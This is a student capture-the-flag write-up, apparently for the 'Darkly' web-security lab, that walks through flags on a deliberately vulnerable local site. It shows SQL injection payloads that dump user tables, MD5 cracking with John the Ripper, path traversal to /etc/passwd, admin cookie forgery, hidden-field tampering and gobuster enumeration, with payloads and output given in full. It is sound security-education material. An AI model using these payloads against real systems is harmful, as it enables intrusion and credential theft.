### Flag 00 03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA

The first vulnerability we found is the possibility to cheat very easily on a survey hosted on the website.
The server assumes the values as being from 1 to 10, but you can send the request with a much higher grade.

http://localhost:13080/?page=survey
Inspect option of Ben
Change value to 11 (negative didn't work)

### Flag 01 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5

Search members page queries the database directly using SQL

vulnerable to sql injections we assume

5 UNION SELECT COUNT(_), NULL FROM users --
5 UNION SELECT COUNT(_), first_name FROM users --

this lists all table names

```
6 UNION SELECT NULL, table_name FROM information_schema.tables--
```

this lists all column names

```
6 UNION SELECT NULL, column_name FROM information_schema.columns--
```

this lists all columns of the table users, we're using hex because strings are being escaped

```
6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
```

listing all columns gave us this :

```
ID: 5 UNION SELECT NULL, column_name FROM information_schema.columns--
First name:
Surname : FLAG
```

which is sus

but after finding the table that this columbs belong to

```

ID: 5 UNION SELECT NULL, table_name FROM information_schema.columns WHERE column_name=0x464C4147--
First name:
Surname : INNODB_SYS_TABLES

```

and trying to get FLAG from it

```

5 UNION SELECT NULL, FLAG FROM INNODB_SYS_TABLES--

```

we get

```

Table 'Member_Sql_Injection.INNODB_SYS_TABLES' doesn't exist

```

seemingly it's a metadata table and flag is actually in the documentation as being "The flag field returns the dict_table_t::flags that correspond to the data dictionary record."

so wrong way

however we queried all columns from users

```
ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : town

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : country

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : planet

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : Commentaire

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : countersign
```

and after querying Commentaire & countersign we get

```
ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Je pense, donc je suis
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Aamu on iltaa viisaampi.
Surname : 60e9032c586fb422e2c16dee6286cf10

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Dublin is a city of stories and secrets.
Surname : e083b24a01c483437bcf4a9eea7c1b4d

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

its MD5 again according to dcode

and after using john the ripper :

```
darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 countersign
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-21 16:49) 0g/s 145600p/s 145600c/s 145600C/s Getflag1905..Getflag1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
Disabling duplicate candidate password suppressor
FortyTwo         (GetFlag)
1g 0:00:00:30 DONE 2/3 (2024-11-21 16:49) 0.03243g/s 14193Kp/s 14193Kc/s 14193KC/s NorwaY1..KushaL
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

now we we lower case to : fortytwo, encode it to sha256 as asked and tada : 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5

### Flag 02 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

http://localhost:13080/index.php?page=recover
when asking to recover the password, the form has a hidden field

```
<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
```

Change webmaster@borntosec.com to whatever
1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

### Flag 03 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

Don't really get this one, just input 'a' as name and nothing as message and you get a flag

http://localhost:13080/index.php?page=feedback
Name: a
0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

### Flag 04 (WIP)

found this page by clicking on the very bottom of the screen on "© BornToSec"

Hashcrack this http://localhost:13080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

might actually just be a flag in itself as it looks like SHA-256 as well but ????

seems like its domain xss or something there is a coucou function and modifying the dom through js

### Flag 05 (WIP)

a weirdly loaded image http://localhost:13080/index.php?page=media&src=1

### Flag 06 (WIP)

Wtf?
http://localhost:13080/index.php?page=

### Flag 07 df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

cookie I_am_admin

cookie value is "68934a3e9455fa72420237eb05902327"
suspiciously looks like MD5 again

and lo and behold

```
../john/run/john --format=Raw-MD5 i_am_admin_cookie
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 19 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-21 17:25) 0g/s 102000p/s 102000c/s 102000C/s Cookie1921..Cookie1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
false            (cookie)
1g 0:00:00:00 DONE 2/3 (2024-11-21 17:25) 7.692g/s 3206Kp/s 3206Kc/s 3206KC/s leticia22..qwzxas
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

so the cookie value is false

replacing it with true in md5 and clicking on home

and we get

```
Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```

### Flag 08 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

found this dir using gobuster

http://localhost:8080/whatever/

there is a htpasswd file containing

```
`root:437394baff5aa33daa618be47b75cb49`
```

Seems to be hashed in md5, we cracked the password using John the Ripper:

```bash
../john/run/john --format=Raw-MD5 htpasswd
```

gives us the password

```
Enabling duplicate candidate password suppressor
qwerty123@       (root)
```

so now we can connect to this page which we also found through gobuster

http://localhost:8080/admin/

using root as username and qwerty123@ as password, which gets us the flag

### FLAG 09 b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

http://localhost:8080/index.php?page=../../../../etc/passwd

ALMOST

http://localhost:8080/index.php?page=../../../../../var/log/httpd/access.log

STILL NOPE

and a bunch more until

http://localhost:8080/index.php?page=../../../../../../../etc/passwd

which gives us

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

### FLAG 10 F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188

SEARCH IMAGE, IMAGE NUMBER 5

comes up to

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

going for sql injections : 5 OR 1=1--
gives

```
ID: 5 OR 1=1--
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 5 OR 1=1--
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 5 OR 1=1--
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 5 OR 1=1--
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 5 OR 1=1--
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

vulnerable to sql injections even though it doesnt return errors

this gives us what tables we have access to

```
ID: -1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
Title: list_images
Url :
```

which is list_images

listing the values in list_images

```
ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: id
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: url
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: title
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: comment
Url :
```

we see an interesting thing, the comment

and fetching the values gives us

```
ID: 6 UNION SELECT title, comment FROM list_images--
Title: An image about the NSA !
Url : Nsa

ID: 6 UNION SELECT title, comment FROM list_images--
Title: There is a number..
Url : 42 !

ID: 6 UNION SELECT title, comment FROM list_images--
Title: Google it !
Url : Google

ID: 6 UNION SELECT title, comment FROM list_images--
Title: Earth!
Url : Earth

ID: 6 UNION SELECT title, comment FROM list_images--
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

using john

```
darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 comment
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-26 19:24) 0g/s 8564p/s 8564c/s 8564C/s Getflag1905..Getflag1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
albatroz         (GetFlag)
1g 0:00:00:00 DONE 2/3 (2024-11-26 19:24) 2.703g/s 645318p/s 645318c/s 645318C/s billy420..sylveste
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

albatroz to sha256 gives us : F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188

### FLAG 11 b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3

there is a bunch of redirect links at the bottom to twitter, instagram and so on

we can just modify the query from

```
http://localhost:8080/index.php?page=redirect&site=instagram
```

to anything

```
http://localhost:8080/index.php?page=redirect&site=ifoundavulnerability
```

and we get a flag

## FLAG 12 d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466

gobuster gave us robots.txt
which says to hid /whatever (already got the flag there) and /.hidden

there is a bunch of files and dir in /.hidden

tried to see if there was any meaning to the names of the dir and files but nothing
all files have a readme which taunts us like "Try again"

so we need to make a crawler, which we do and search for keyword flag and it works the first time, we could also have just removed all the few special messages
in the other readmes, or search by size but flag works

and we get

```
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

in http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README

### TO NOTE

➜ utenret gobuster dir -u http://localhost:8080/ -w KaliLists/dirb/big.txt -b 200,975

```
➜  darklyProject git:(master) ✗ gobuster dir -u http://localhost:8080/ -w ../KaliLists/dirb/big.txt --exclude-length 975

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../KaliLists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          975
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 193] [--> http://localhost/admin/]
/audio                (Status: 301) [Size: 193] [--> http://localhost/audio/]
/css                  (Status: 301) [Size: 193] [--> http://localhost/css/]
/errors               (Status: 301) [Size: 193] [--> http://localhost/errors/]
/favicon.ico          (Status: 200) [Size: 1406]
/fonts                (Status: 301) [Size: 193] [--> http://localhost/fonts/]
/images               (Status: 301) [Size: 193] [--> http://localhost/images/]
/includes             (Status: 301) [Size: 193] [--> http://localhost/includes/]
/js                   (Status: 301) [Size: 193] [--> http://localhost/js/]
/robots.txt           (Status: 200) [Size: 53]
/whatever             (Status: 301) [Size: 193] [--> http://localhost/whatever/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```
